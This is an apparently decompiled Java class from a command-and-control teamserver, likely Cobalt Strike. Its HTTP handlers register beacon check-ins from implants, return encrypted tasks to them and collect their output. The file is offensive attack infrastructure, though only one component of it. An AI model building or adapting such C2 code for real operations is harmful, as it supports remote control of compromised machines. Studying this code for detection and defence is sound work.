package beacon;

import c2profile.MalleableHook;
import c2profile.Profile;
import common.BeaconEntry;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import java.io.InputStream;
import java.util.Properties;
import server.ServerUtils;

public class BeaconHTTP {
   protected MalleableHook.MyHook geth = new GetHandler();
   protected MalleableHook.MyHook posth = new PostHandler();
   protected BeaconC2 controller;
   protected Profile c2profile;
   protected ScListener listener;

   public BeaconHTTP(ScListener var1, Profile var2, BeaconC2 var3) {
      this.c2profile = var2;
      this.controller = var3;
      this.listener = var1;
   }

   public MalleableHook.MyHook getGetHandler() {
      return this.geth;
   }

   public MalleableHook.MyHook getPostHandler() {
      return this.posth;
   }

   protected String getPostedData(Properties var1) {
      if (var1.containsKey("input") && var1.get("input") instanceof InputStream) {
         InputStream var2 = (InputStream)var1.get("input");
         byte[] var3 = CommonUtils.readAll(var2);
         String var4 = CommonUtils.bString(var3);
         return var4;
      } else {
         return "";
      }
   }

   private class PostHandler implements MalleableHook.MyHook {
      private PostHandler() {
      }

      public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
         try {
            String var5 = "";
            String var6 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
            String var7 = BeaconHTTP.this.getPostedData(var4);
            var5 = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", var3, var4, var7, var1));
            if (var5.length() == 0) {
               CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
               MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
            } else {
               byte[] var8 = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", var3, var4, var7, var1));
               if (var8.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(var5, var8)) {
                  MudgeSanity.debugRequest(".http-post.client.output", var3, var4, var7, var1, var6);
               }
            }
         } catch (Exception var9) {
            MudgeSanity.logException("beacon post handler", var9, false);
         }

         return new byte[0];
      }

      // $FF: synthetic method
      PostHandler(Object var2) {
         this();
      }
   }

   private class GetHandler implements MalleableHook.MyHook {
      private GetHandler() {
      }

      public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
         String var5 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
         String var6 = BeaconHTTP.this.c2profile.recover(".http-get.client.metadata", var3, var4, BeaconHTTP.this.getPostedData(var4), var1);
         if (var6.length() != 0 && var6.length() == 128) {
            BeaconEntry var7 = BeaconHTTP.this.controller.process_beacon_metadata(BeaconHTTP.this.listener, var5, CommonUtils.toBytes(var6), (String)null, 0);
            if (var7 == null) {
               MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);
               return new byte[0];
            } else {
               byte[] var8 = BeaconHTTP.this.controller.dump(var7.getId(), 921600, 1048576);
               if (var8.length > 0) {
                  byte[] var9 = BeaconHTTP.this.controller.getSymmetricCrypto().encrypt(var7.getId(), var8);
                  return var9;
               } else {
                  return new byte[0];
               }
            }
         } else {
            CommonUtils.print_error("Invalid session id");
            MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);
            return new byte[0];
         }
      }

      // $FF: synthetic method
      GetHandler(Object var2) {
         this();
      }
   }
}
